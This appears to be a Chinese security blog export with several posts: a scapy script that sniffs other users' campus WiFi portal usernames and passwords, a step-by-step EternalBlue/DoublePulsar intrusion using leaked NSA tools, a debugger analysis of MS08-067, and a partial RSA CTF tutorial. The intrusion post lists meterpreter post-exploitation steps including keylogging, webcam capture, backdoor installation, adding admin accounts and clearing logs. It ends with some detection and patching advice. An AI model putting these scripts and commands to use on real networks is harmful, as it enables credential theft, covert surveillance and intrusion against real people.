i_p_pl=JTdCJTIyZXJyb3JOdW1iZXIlMjIlM0ElMjIxJTIyJTJDJTIybmV4dFVybCUyMiUzQSUyMmh0dHAlM0ElMkYlMkYxOTIuMTY4LjE1MC4yJTNBODA4MCUyRnBvcnRhbCUyRmluZGV4X2RlZmF1bHQuanNwJTIyJTJDJTIycXVpY2tBdXRoJTIyJTNBZmFsc2UlMkMlMjJjbGllbnRMYW5ndWFnZSUyMiUzQSUyMkNoaW5lc2UlMjIlMkMlMjJhc3NpZ25JcFR5cGUlMjIlM0EwJTJDJTIyaU5vZGVQd2ROZWVkRW5jcnlwdCUyMiUzQTElMkMlMjJ3bGFubmFzaWQlMjIlM0ElMjIlMjIlMkMlMjJ3bGFuc3NpZCUyMiUzQSUyMiUyMiUyQyUyMm5hc0lwJTIyJTNBJTIyJTIyJTJDJTIyYnlvZFNlcnZlcklwJTIyJTNBJTIyMC4wLjAuMCUyMiUyQyUyMmJ5b2RTZXJ2ZXJJcHY2JTIyJTNBJTIyMDAwMCUzQTAwMDAlM0EwMDAwJTNBMDAwMCUzQTAwMDAlM0EwMDAwJTNBMDAwMCUzQTAwMDAlMjIlMkMlMjJieW9kU2VydmVySHR0cFBvcnQlMjIlM0ElMjI4MDgwJTIyJTJDJTIyaWZUcnlVc2VQb3B1cFdpbmRvdyUyMiUzQWZhbHNlJTJDJTIydWFtSW5pdEN1c3RvbSUyMiUzQSUyMjElMjIlMkMlMjJjdXN0b21DZmclMjIlM0ElMjJNUSUyMiUyQyUyMnJlZ0NvZGVUeXBlJTIyJTNBJTIyTUElMjIlN0Q 很明显这是一个base64编码过的字符串，把这个base64解码再url解码，就得到了 {“errorNumber”:”1”,”nextUrl”:”http://192.168.xxx.x:xxxx/portal/index_default.jsp**“,”quickAuth”:false,”clientLanguage”:”Chinese”,”assignIpType”:0,”iNodePwdNeedEncrypt”:1,”wlannasid”:””,”wlanssid”:””,”nasIp”:””,”byodServerIp”:”0.0.0.0”,”byodServerIpv6”:”0000:0000:0000:0000:0000:0000:0000:0000”,”byodServerHttpPort”:”8080”,”ifTryUsePopupWindow”:false,”uamInitCustom”:”1”,”customCfg”:”MQ”,”regCodeType”:”MA”} 这只是向无线路由器发送的表明自己身份的未完成的表单，没有我们要的用户名和密码。 完整认证过程只有GET请求果然很扯，这很有可能是我们的浏览器网络流分析工具有些问题，或者该Web认证的安全性足够好，导致我们无法截取完整的请求流。 这样就只有用Wireshark来对网卡进行完全的监听，以抓取全部流量包。 设置Capture interface为 WLAN 无线网卡，开启抓取后重现登陆过程。 抓到的流量包除了访问该认证网站的http流，还包括了所有经过该无线网卡的所有协议的网络流。 设置过滤规则为http协议并且只有该认证网址ip。 发现登录一次h3c系统，要先后传参给3个页面，一个/pws？t=li，一个/afterlogin.jsp,一个/loginSucc.jsp，所以就分别看这几个网页的抓包数据。 发现其cookie都是一样的，但是只有pws这个页面是POST请求。 查看pws应用层传输的数据，发现上传了【userName】和【userPwd】参数，也就是说，只有这个页面是验证密码的。 【userName】就是登陆的用户名，【userPwd】是经过base64编码后的密码。 总结思路我们可以抓取用户登陆时的POST请求来获取用户名和密码，也可以在用户勾选【记住密码】时获取带有用户名密码信息的cookie。 当抓到client ==&gt; server的数据包时 如果是GET请求，检查有没有Cookie存在。 如果是POST请求，把用户名和密码拿出来。 检查是否有set-cookie头部，有的话取出来。 最后如果有cookie被嗅探到，就带着cookie把向server索要一下密码。 但是为了偷懒，这里就不嗅探cookie了，直接嗅探POST的用户名和密码就行了。最终思路如下： 当抓到client ==&gt; server的数据包时，如果是POST请求，直接把用户名和密码拿出来。 嗅探实验环境 Ubuntu虚拟机 大功率USB无线网卡（8187等） python2.7 python扩展库需要 requests scapy scapy_http lxml ** 代码 123456789101112131415161718192021222324252627import requestsimport scapy_http.http as httpfrom scapy.all import *from lxml import etreeiface = 'wlan0'url = \"http://192.168.xxx.x:xxxx/portal/pws?t=li\"path = \"/root\"def prn(pkt): data = None #std ==&gt; ap if pkt.haslayer(http.HTTPRequest): #if post the username and password if pkt.Method == 'POST' and 'userName' in pkt.load: dt = {i.split(\"=\")[0]:i.split(\"=\")[1] for i in pkt.load.split(\"&amp;\")} data = \":::\".join((dt[\"userName\"],dt[\"userPwd\"][3:].decode(\"base64\"))) + '\\n' print '[+]Get! Post data:%s %s %s %s'%(dt['userName'],dt['userPwd']) if data != None: with open(path + \"schoolUserPwd.txt\", \"a\") as txt: txt.write(data)def main(): try: sniff(iface=iface, prn=prn, filter=\"ip host 192.168.xxx.x\", store=0) #sniff(offline=path + \"school.pcap\", prn=prn, filter=\"ip host 192.168.xxx.x\") except KeyboardInterrupt, e: print \"quitting...\"if __name__ == '__main__': main() 说明 requests用来向服务器请求 scapy用来在无线网络中嗅探 scapy_http用来对http协议更方便的解析 lxml用来从服务器返回的html文件中，解析出来用户名和密码 prn是sniff函数每过滤到一个符合条件的数据包时回调的函数，并将数据包本身作为参数传入 之所以选择Ubuntu而不是Windows是因为scapy_http在win下运行有些问题 注意 由于我们既要嗅探，同时又要向服务器请求，所以airmon-ng check kill后，无线网卡开启monitor模式，再将网卡调到信号最强的ap的信道上。之前经过kismet抓取无线网包发现该校园网WIFI是在channel 1/6/11信道上工作的。 最后再打开网络管理的服务。 执行以下命令 123456$sudo airmon-ng check kill$sudo ifconfig wlan0 down$sudo iwconfig wlan0 mode monitor$sudo ifconfig wlan0 up$sudo iwconfig mon0 channel 1/6/11$sudo service network-manager start 结果 由于之前买的无线网卡是劣质品无法识别，因此暂无结果。 理论上是可以嗅探到的，等成功嗅探后再补发。 就算没有嗅探到，这个思路也是可以学习一下的。。。","link":"/2017/05/09/JNU-Wifi-sniff/"},{"title":"NSA方程式工具利用与分析","text":"前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0，任何人都可以直接下载并远程攻击利用。 Shadowbroker下载地址 https://yadi.sk/d/NJqzpqo_3GxZA4 解压密码：Reeeeeeeeeeeeeee github下载地址：https://github.com/misterch0c/shadowbroker 释放的工具总共包含三个文件夹， Swift：包含了NSA对SWIFT银行系统发动攻击的相关证据，其中有EastNets的一些PPT文档、相关的证据、一些登录凭证和内部架构，EastNets是中东最大的SWIFT服务机构之一。 OddJob：包含一个基于Windows的植入软件，并包括所指定的配置文件和payload。适用于Windows Server 2003 Enterprise（甚至Windows XP Professional） Windows：包含对Windows操作系统的许多黑客工具，但主要针对的是较旧版本的Windows（Windows XP中）和Server 2003。 主要工具FUZZBUNCH：一款类似Metasploit的Exploit框架模块==&gt;漏洞==&gt;影响系统==&gt;默认端口 Easypi ==&gt; IBM Lotus Notes漏洞==&gt;Windows NT, 2000 ,XP, 2003==&gt;3264 Easybee ==&gt;MDaemon WorldClient电子邮件服务器漏洞 ==&gt;WorldClient 9.5, 9.6, 10.0, 10.1 Eternalblue ==&gt;SMBv2漏洞(MS17-010) ==&gt;Windows XP(32),Windows Server 2008 R2(32/64),Windows 7(32/64) ==&gt;139/445 Doublepulsar ==&gt;SMB和NBT漏洞Windows XP(32), Vista, 7, Windows Server 2003, 2008, 2008 R2 ==&gt;139/445 Eternalromance ==&gt;SMBv1漏洞(MS17-010)和 NBT漏洞 ==&gt;Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2 ==&gt;139/445 Eternalchampion ==&gt; SMB和NBT漏洞 ==&gt;Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2, 2012, Windows 8 SP0 ==&gt;139/445 Eternalsynergy ==&gt;SMB和NBT漏洞 ==&gt;Windows 8, Windows Server 2012 ==&gt;139/445 Explodingcan ==&gt;IIS6.0远程利用漏洞 ==&gt;Windows Server 2003 ==&gt;80 Emphasismine ==&gt;IMAP漏洞 ==&gt;IBM Lotus Domino 6.5.4, 6.5.5, 7.0, 8.0, 8.5 ==&gt;143 Ewokfrenzy ==&gt;IMAP漏洞 ==&gt;IBM Lotus Domino 6.5.4, 7.0.2== &gt;143 Englishmansdentist ==&gt;SMTP漏洞==&gt; ==&gt;25 Erraticgopher ==&gt;RPC漏洞 ==&gt;Windows XP SP3, Windows 2003 ==&gt;445 Eskimoroll ==&gt;kerberos漏洞 ==&gt;Windows 2000, 2003, 2003 R2, 2008, 2008 R2 ==&gt;88 Eclipsedwing ==&gt;MS08-067漏洞 ==&gt;Windows 2000, XP, 2003 ==&gt;139/445 Educatedscholar ==&gt;MS09-050漏洞 ==&gt;Windows vista, 2008 ==&gt;445 Emeraldthread ==&gt;SMB和NBT漏洞 ==&gt;Windows XP, 2003 ==&gt;139/445 Zippybeer ==&gt;SMTP漏洞 ==&gt; ==&gt; 445 Esteemaudit ==&gt;RDP漏洞 ==&gt;Windows XP, Windows Server 2003 ==&gt;3389 ETERNALBLUE攻击原理分析ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。 漏洞发生处：C:\\Windows\\System32\\drivers\\srv.sys (注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。 漏洞函数：unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2) 触发点：_memmove(v5, (const void )(a2 + 5 + (_BYTE )(a1 + 5)), (_WORD *)(a1 + 6)); 原因：逻辑不正确导致的越界写入 官方补丁修复前： 123456789101112131415161718192021int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1){ //SNIP... while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &gt; v4)) { *(WORD*)v6 = v3 - (_DWORD)v6; //&lt;----------修改处 return v1; } //SNIP...}int __thiscall ExecuteTransaction(int this){ //SNIP... if (*(_DWORD *)(v3 + 0x50) &gt;= 1) //&lt;------修改处 { _SrvSetSmbError2(0, 464, &quot;onecore\\\\base\\\\fs\\\\remotefs\\\\smb\\\\srv\\\\srv.downlevel\\\\smbtrans.c&quot;); SrvLogInvalidSmbDirect(v1, v10); goto LABEL_109; } //SNIP...} 修复后： 123456789101112131415161718192021int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1){ //SNIP... while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &gt; v4)) { *(DWORD*)v6 = v3 - (_DWORD)v6; //&lt;--------修改处 return v1; } //SNIP...}int __thiscall ExecuteTransaction(int this){ //SNIP... if (*(_DWORD *)(v3 + 0x50) &gt;= 2u) //&lt;------修改处 { _SrvSetSmbError2(0, 464, &quot;onecore\\\\base\\\\fs\\\\remotefs\\\\smb\\\\srv\\\\srv.downlevel\\\\smbtrans.c&quot;); SrvLogInvalidSmbDirect(v1, v10); goto LABEL_109; } //SNIP...} 具体见参考资料5 漏洞复现 环境搭建 | 主机类型 | OS | IP || :–: | :————: | :———-: || 攻击机1 | win2003 | 10.10.10.130 || 攻击机2 | kali linux 2.0 | 10.10.10.128 || 靶机 | winXP x86 | 10.10.10.129 | 工具准备 解压NSA工具包中的windows文件夹到攻击机1的C:\\目录下（只要不是中文目录皆可）; 在攻击机1安装: python-2.6.6.msi** pywin32-221.win32-py2.6.exe** 在攻击机2先生成用于回连的dll 1msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f dll &gt; x86bind.dll 3.扫描开启445端口的活跃主机并探测操作系统 12nmap -Pn -p445 -O 10.10.10.0/24nmap -Pn -p445 -O -iL ip.txt 4.攻击机1开始利用ETERNALBLUE攻击 12python fb.py use Eternalblue ... 5.利用Doublepulsar注入dll 1use Doublepulsar 6.kali攻击机利用msf回连控制主机5555端口 12345use exploit/multi/handlerset payload windows/meterpreter/bind_tcpset LPORT 5555set RHOST XXX.XXX.XXX.XXXexploit 后渗透攻击 开3389端口 wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1 12- wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1 12- reg add “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 123456针对win XP及win2003只需要第3条命令针对win 7需要第1，2条命令针对win 2012需要3条命令1. 添加账户进管理组 net user [username] [password] /add net localgroup Administrators [username] /add 122. 端口转发如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接 portfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX rdesktop -u root -p toor 127.0.0.1:4444 123456789101112131415163. meterpreter自带的多功能shell - hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文 - screenshot:获取屏幕截图 - webcam_snap:调取对方摄像头拍照 - keyscan_start,keyscan_dump:记录键盘动作 - ps:查看当前运行进程 - sysinfo:查看系统信息 - getsystem:提权4. 维持控制 - migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用 - irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态 irb client.core.use(&quot;railgun) client.railgun.kernel32.SetThreadExecutionState(&quot;ES_CONTINUOUS|ES_SYSTEM_REQUIRED&quot;) 12345678 - background:隐藏在后台方便msf终端进行其他操作，session查看对话id - session -i X:使用已经成功获取的对话5. 植入后门 - 测试是否虚拟机： run post/windows/gather/checkvm 12- 以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载 metsrv.dll run metsvc 12- getgui开启远程桌面： run getgui -u sherlly -p sherlly run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc //清除痕迹，关闭服务，删除添加账号 123456789101112136. 清除入侵痕迹- clearev:清除日志- timestomp:修改文件的创建时间，最后写入和最后访问时间timestomp xiugai.doc -f old.doc# **检测&amp;防御**1. 国外有人写了个检测Doublepulsar入侵的脚本，运行环境需要python2.6, 地址 countercept/doublepulsar-detection-script** ，使用方法 python detect_doublepulsar_smb.py --ip XXX.XXX.XXX.XXX python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1 123456另外，nmap也基于该脚本出了对应扫描脚本smb-double-pulsar-backdoor.nse**，使用方法 nmap -p 445 &lt;target&gt; --script=smb-double-pulsar-backdoor 安装相应补丁Protecting customers and evaluating risk** 如非必要，关闭25, 88, 139, 445, 3389端口 使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7) 参考 Latest Hacking Tools Leak Indicates NSA Was Targeting SWIFT Banking Network** ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生 - FreeBuf.COM | 关注黑客与极客** Leaked NSA hacking tools are a hit on the dark web - CyberScoop** srv.sys Windows process - What is it?** NSA Eternalblue SMB 漏洞分析** smb-double-pulsar-backdoor NSE Script** 如何设置Windows 7 防火墙端口规则","link":"/2017/04/28/NSA-tools/"},{"title":"MS08-067漏洞原理分析及还原","text":"最近利用MS17-010漏洞肆虐的WanaCry勒索病毒让445端口走进了大众的视线，除了这次的MS17-010，在08年年底爆出的MS08-067特大漏洞同样是利用了445端口。 在《Metasploit渗透测试魔鬼训练营》中讲过对MS08-067漏洞原理的分析，不过作者的文笔十分晦涩难懂，读起来十分难消化，我反复阅读钻研了几遍，并配合实践分析，对该部分的内容大致理解了一些，在这里就用通俗易懂的语言重新组织一遍，就当做分享和学习总结吧。 445端口首先介绍一下这个引发了诸多特大漏洞的445端口。 TCP 445端口主要运行两种服务： SMB 网络服务 MSRPC 网络服务 SMB（Server Message Block，服务器消息块）首先提供了 Windows 网络中最常用的远程文件与打印机共享网络服务，其次，SMB的命名管道是 MSRPC 协议认证和调用本地服务的承载传输层。 SMB 作为应用层协议，其直接运行在TCP 445端口上，也可通过调用 NBT 的 TCP 139端口来接收数据。 MSRPC（Microsoft Remote Procedure Call，微软远程过程调用）是对 DCE/RPC 在 Windows 系统下的重新改进和实现，用以支持Windows系统中的应用程序能够无缝地通过网络调用远程主机上服务进程中的过程。 DCE/RPC 独立运行于网络传输层协议上，采用的网络传输层协议包括： ncacn_ip_tcp =&gt; TCP 139 ncadg_ip_udp =&gt; UDP 135 ncacn_np =&gt; TCP 139、445 其中，主要使用的是 ncacn_np（SMB命名管道传输协议），也就是利用 SMB 命名管道机制作为 RPC 的承载传输协议（MSRPC over SMB）。 只有少数如MS09-050是直接针对SMB服务的，而MSRPC作为调用大量本地服务进程的网络接口，常常被利用 MSRPC over SMB 为通道如MS08-067来攻击本地服务中存在的安全漏洞。 0x01 MS08-067漏洞原理MS08-067漏洞是通过 MSRPC over SMB 通道调用 Server 服务程序中的 NetPathCanonicalize 函数时触发的，而 NetPathCanonicalize 函数在远程访问其他主机时，会调用 NetpwPathCanonicalize 函数，对远程访问的路径进行规范化，而在 NetpwPathCanonicalize 函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。 所谓路径规范化，就是将路径字符串中的【/】转换为【\\】，同时去除相对路径【.\\】和【..\\】。如： 12**/*/./** =&gt; **\\*\\****\\*\\..\\** =&gt; **\\** 在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【..\\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。 路径处理流程NetpwPathCanonicalize 函数并没有直接进行输入路径和规范化，而是继续调用了下级函数CanonicalizePathName 来进行路径整理，将待整理的路径字符串进行规范化，然后再保存到预先分配的输出路径缓冲区buffer中。 路径处理流程： 检查待整理路径的第一个字符 调用msvcrt.dll模块的wcslen函数计算路径长度 调用msvcrt.dll模块的wcscat函数把待整理路径全部复制到新申请的内存中 \\4. 调用wcscpy函数，去掉待整理路径中第一个表示父目录的相对路径复制到strTemp，如： 1\\******\\..\\..\\*** =&gt; \\..\\*** 5.循环调用wcscpy，直到路径整理完毕 在这里我们知道了，在规范化复制时要寻找表示父目录的【..\\】字符串及其前面的一个【\\】字符串，将这一段去掉并将新路径复制。 如图，第一次检查时去掉了第一个相对路径并复制到缓冲区 但是，当【..\\】字符串在路径字符串的最前面时，那么其前面的一个【\\】就在缓冲区外面了，就是在这里产生了向前（低地址）的溢出。 缓冲区溢出需要明确的是，微软对路径规范化时的字符串复制可能出现的缓冲区溢出做了初步的防御。 在每次向缓冲区中复制字符串时，无论是用 wcsccpy 还是 wcscat，在复制前总要比较源字符串的长度，保证长度小于某个值（207），否则不会继续复制，这一策略确保缓冲区不会向高地址溢出，即当前函数返回时不会发生问题。 但是注意，在规范化表示路径，寻找父目录的【..\\】字符串前面的【\\】字符时，程序做了判断和边界检查：如果当前比较字符的地址与源字符串地址相同，就表明整个字符串已经查找完毕，程序就会停止查找。 然而它唯独漏了一种情况，就是当父目录相对路径【..\\】字符串在源字符串的开头时，在开始查找时比较的字符串(【\\】到【..\\】)位于缓冲区之外，这导致了复制的字符串向低地址的溢出，造成函数wcscpy的返回地址被覆盖。 0x02 漏洞还原分析实验环境 靶机 Windows2003 SP0 EN 漏洞组件 netapi32.dll 工具 IDA Pro、OllyDbg 选择 Windows XP SP3 EN 系统主机作为分析环境，定位到包含该安全漏洞的系统模块netapi32.dll（路径C:\\Windows\\system32）和调用漏洞服务 Server 的进程 svchost.exe，目标进程命令行为 1C:\\Windows\\System32\\svchost.exe-k netsvcs 用 IDA pro 打开 netapi32.dll，找到漏洞所在的 NetpwPathCanonicalize 函（每次运行堆栈中的地址会不同，但各函数的地址一样），如图在书中提到 查看该函数流程图，可以看到，此函数并没有直接进行输入路径的规范化， 而是继续调用了下级函数 CanonicalizePathName 然而在实际操作中并没有发现 CanonicalizePathName 这个函数，并且多种资料表明应当是调用 CanonPathName 函数进行规范化。 IDA分析 NetpwPathCanonicalize 函数代码（F5 + 整理 + 主要代码）： 该函数声明如下： 12345678DWORD NetpwPathCanonicalize( LPWSTR PathName, //需要标准化的路径 LPWSTR Outbuf, //存储标准化后的路径的Buffer DWORD OutbufLen, //Buffer长度 LPWSTR Prefix, //可选参数，当PathName是相对路径时有用 LPDWORD PathType, //存储路径类型 DWORD Flags // 保留，为0 ) 动态调试通过wmic查看命令行参数为svchost.exe -k netsvcs的进程pid 打开OllyDbg，点击file-&gt;attach，附着到svchost.exe进程上 View-&gt;Executable modules双击netapi32，在cpu指令窗口右键选Search for查找exec(label) in current module，找到函数NetpwPathCanonicalize，地址为71C44A3E，在此处设下断点。 追踪漏洞触发过程回到CPU指令窗口运行程序，然后攻击机Metasploit加载ms08_067_netapi模块并exploit NetpwPathCanonicalize中断分析环境中的svchost程序会中断在 NetpwPathCanonicalize 函数的入口地址处。该函数的传入参数如下所示： 1234567esp [esp] * 注释 *00ECF924 02248D34 ;指向待整理路径00ECF928 022321D8 ;指向输出路径buffer00ECF92C 000003F1 ;输出buffer的长度00ECF930 02248FB0 ;指向prefix，值为 \\x5C\\x00 ，即unicode ‘\\’00ECF934 02248FB4 ;指向路径类型，值为 0x100100ECF938 00000000 ;WORD Flags保留，值为0 CanonicalizePathName中断结合IDA pro对 NetpwPathCanonicalize 的流程分析，在 地址处将调用下一级函数 CanonPathName，在此地址设下断点。 运行到此断点，然后跟踪函数 CanonPathName，传入参数如下所示： 1234500F0F8FC 00157570 ;指向prefix，值为\\x5C\\00，即Unicode&quot;\\&quot;00F0F900 001572F4 ;指向待整理路径00F0F904 02132E80 ;指向输出路径的buffer00F0F908 000003F9 ;输出buffer的长度00F0F90C 00000000 ;WORD Flag保留字，值为0 从上两个函数的参数传递可以看出，函数 CanonPathName 进行路径整理，然后再保存到预先分配的输出路径缓冲区buffer中。 待整理路径结构在OD中查看待整理路径的结构，路径是Unicode字符串，以【\\x5C\\x00】(Unicode字符“\\”)开始，【\\x00\\x00】结束，中间包含一些随机的大小写字母，较长一段不可显示的字符是经过编码的Shellcode，其中最关键的是两个连在一起的父目录相对路径【....\\】。 整个待整理路径形如： 1\\******\\..\\..\\*** 整理路径前的预操作在待整理路径所在内存地址000C0F50处4字节上设内存访问断点 按F9运行，会中断3次，前两次分别是检查待整理路径的第一个字符和调用wcslen函数，第三次是在调用wcscat函数。分析第三次传入栈中两个参数 第一个是strDestination，指向一段以【\\x5c\\x00】开头的内存空间；第二个是strSource，指向上述待整理路径前两字节【\\x5c\\x00】后的内容。 程序把待整理路径全部复制到strDestination，即0x001572F6处。在此4字节设断点，类型选择”Hardware, on access”DWord。 复制路径到缓冲区F9继续运行，第4次中断在0x77BD4010 ，内存里显示这里将src的前两个字符复制到了dest的【\\x5C\\x00】后面，这是由于这两个字节设了断点的原因。 第5次中断在0x71C44B1C，位于wcscat函数内，内存显示已将src复制到dest，如图: 第一次路径规范化按F9运行，中断多次后停在内存0x77bd4d36处，通过栈可知此处属于wcscpy函数。此处调用该函数进行第一次路径规范化。如图 当前参数src值为0x00EC6E0，指向【..***】;参数 strDestination 值为0x00ECF4DC，指向temp中的第一个字符【\\】。 显然，这次路径规范化即把待整理路径中第一个字符【\\】和第一个【..\\】相对路径之间的内容抛弃。 而此时wcscpy源地址src在edx寄存器中，指向【..***】；目的地址dest在ecx寄存器中，指向待整理路径第一个字符【\\】，如图 所以，这次字符串复制操作就是去掉第一个表示父目录的相对路径，即待整理路径temp中的第一个【\\】和第一个【..\\】之间的内容成为无用路径被抛弃。操作完成后，temp中的路径字符形如【..***】。 第一次规范化后，待整理路径形如 1\\..\\*** 由于还有【..\\】，还需要进行一次规范化，而这第二次规范化正是玄机所在。 第二次路径规范化由于每次路径规范化都会调用wcscpy函数，接下来删除0x00ECF4DC的硬件断点，直接在wcscpy函数的入口地址0x77BD4D28处下断点。 F9运行后中断在wcscpy函数入口0x77BD4D28处，调用wcscpy函数传入的参数 123esp [esp] * 注释 *00ECF4AC 00ECF494 目的地址，指向的内存区域值为\\x5c\\x00，即【\\】00ECF4B0 00ECF4E2 源地址，指向第二个相对路径【\\..\\】的最后一个斜杠 正常情况下，这次规范化处理会和第一次执行同样的操作，去除第二个相对路径【..\\】，从而完成第二次的路径规范化。但这里出现了一个意外的情况，temp的首地址是0x00ECF4DC，而此次字符串复制操作的目的地址dest却在0x00ECF494，在temp之前，如图 同时注意到，栈指针ESP值为0x00ECF4A8，该地址指向wcscpy函数的返回地址0x71C52FD4。ESP到复制目的dest地址0x00ECF494只有0x14字节，于是，函数wcscpy如果继续执行，将用源字符串src覆盖wcscpy函数的返回地址。 执行到retn命令，可以看到返回地址变成了0x0100129E，，该地址的指令为： 100100129E FFD6 call esi 执行 call esi（ES=0x00F0F4DE）指令，正好将EIP指向复制尽量的字符串中构造好的第8字节空指令，接着是【\\xeb\\x62】（jmp 0x62），此jmp指令跳过中间的随机字符串，指向经过编码的Shellcode，如图 所以这里是由于内存0x00F0F494处的一个【\\】(0x5C)，使得出现在处理父母了相对路径【..\\】时往前溢出了待处理路径，从而将字符串覆盖到函数wcscpy返回地址的位置，跳转到shellcode造成远程代码执行。 正如前面所提到的，当【..\\】在源字符串开头的时候，在开始查找时，比较的字符位于缓冲区之外导致了向前的溢出。","link":"/2017/09/12/MS08-067-analyze/"},{"title":"CTF中RSA的常见攻击方法","text":"RSA基于一个简单的数论事实，两个大素数相乘十分容易，将其进行因式分解确实困难的。在量子计算机还没有成熟的今天，RSA算法凭借其良好的抵抗各种攻击的能力，在公钥密码体制中发挥着中流砥柱的作用。然而即便RSA算法目前来说是安全可靠的，但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题，从而也派生出针对各种特定场景下的RSA攻击方法。 本文针对一些在CTF中常见的RSA攻击方法，从如何识别应该应用那种方法以及如何去解题来介绍CTF中的RSA题目的常见解法。 RSA算法描述RSA算法涉及三个参数，n，e，d，私钥为{n，d}，公钥为{n，e}。 $n= p*q$ $φ(n)= (p-1)*(q-1)$ 其中n是两个大素数p，q的乘积。 d是e模φ(n)的逆元，φ(n)是n的欧拉函数。 $ed = 1 mod φ(n)$ c为密文，m为明文，则加密过程如下： $c = m^e mod φ(n)$$m = c^d mod φ(n)$ RSA题目类型在CTF竞赛中，RSA理所当然处在CRYPTO中居多。而且RSA作为典型的加密算法，其出镜率可谓相当高，基本上所有比赛都会有几道RSA的题目出现。 数据处理在进行做题之前，我们要将数据处理成可以做题的模式。基本上来说，RSA的题目都是围绕着c，m，e，d，n，p，q这几个参数展开的，但是题目一般不会直接给这种样子的参数，而是通过别的方式给出，这里就需要我们使用一些工具或者自己手工将这些参数提取出来。 pem文件 对此类文件可以直接使用openssl提取，大概使用过的方式有： 12openssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.encopenssl rsa -pubin -text -modulus -in warmup -in public.pem pcap文件 针对此类文件可以使用wireshark follow一下。这种问题一般都是写了一个交互的crypto系统，所以可能产生多轮交互。 PPC模式 这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。 第二个需要处理的就是明密文，这个方法多多，不多赘述。 模数分解解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。如果能够将n分解成功，成功得到p，q的取值，那么可求n的欧拉函数的值。 $φ(n) = (p-1)(q-1)$$n = p*q$ 而通过e，d与n的欧拉函数满足如下关系: $ed = 1 mod φ(n)$ $e = d^-1 mod φ(n)$ 通过欧几里得算法可以通过e与n的欧拉函数的值轻易求出d，从而计算出解密密钥。 即在知道e，p，q的情况下，可以解出d： 123456789101112def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % m modinv函数即为求模拟的函数，在知道e，p，q的情况下，可以： 1d=modinv(e,(p-1)*(q-1)) 即可求出解密密钥。 写到这里，要提出一个细节问题，在利用python进行rsa的题目求解过程中： $c = m^e mod φ(n)$ ​ 此类运算需要使用pow函数来进行求解，而不是直接m**e % n，这样会慢死的。Python在处理此类运算进行了优化。比如刚才在已知p，q的时候利用modinv函数求出了d，然后就可以利用pow函数求出明文： 1m=pow(c,d,n) 例题： https://www.jarvisoj.com (very easy RSA) 题目中直接给了p，q，e。 可以直接求出d： 12345p = 3487583947589437589237958723892346254777q = 8767867843568934765983476584376578389e = 65537d = modinv(e, (p-1)*(q-1))print d 直接分解n素数分解问题是困难的，但是可以通过计算机进行暴力分解。1999年，名为Cray的超级计算机用了5个月时间分解了512bit的n。2009年，一群研究人员成功分解了768bit的n。2010年，又提出了一些针对1024bit的n的分解的途径，但是没有正面分解成功。通常意义上来说，一般认为2048bit以上的n是安全的。现在一般的公钥证书都是4096bit的证书。 如果n比较小，那么可以通过工具进行直接n分解，从而得到私钥。如果n的大小小于256bit，那么我们通过本地工具即可爆破成功。例如采用windows平台的RSATool2v17，可以在几分钟内完成256bit的n的分解。 如果n在768bit或者更高，可以尝试使用一些在线的n分解网站，这些网站会存储一些已经分解成功的n，比如：http://factordb.com 通过在此类网站上查询n，如果可以分解或者之前分解成功过，那么可以直接得到p和q。然后利用前述方法求解得到密文。 题目识别 此类问题一般是分值较小的题目，提取出n之后可以发现n的长度小于等于512bit，可以直接取分解n。如果大于512bit，建议在使用每个题目都用后面所说的方法去解题。 例题 比如在某次竞赛中，发现： 1n=87924348264132406875276140514499937145050893665602592992418171647042491658461 利用factordb分解： 1n = 275127860351348928173285174381581152299*319576316814478949870590164193048041239 利用公约数如果在两次公钥的加密过程中使用的n1和n2具有相同的素因子，那么可以利用欧几里得算法直接将n1和n2分解。 通过欧几里得算法可以直接求出n1和n2的最大公约数p： 1gcd(n1,n2)=p 可以得出 $n1 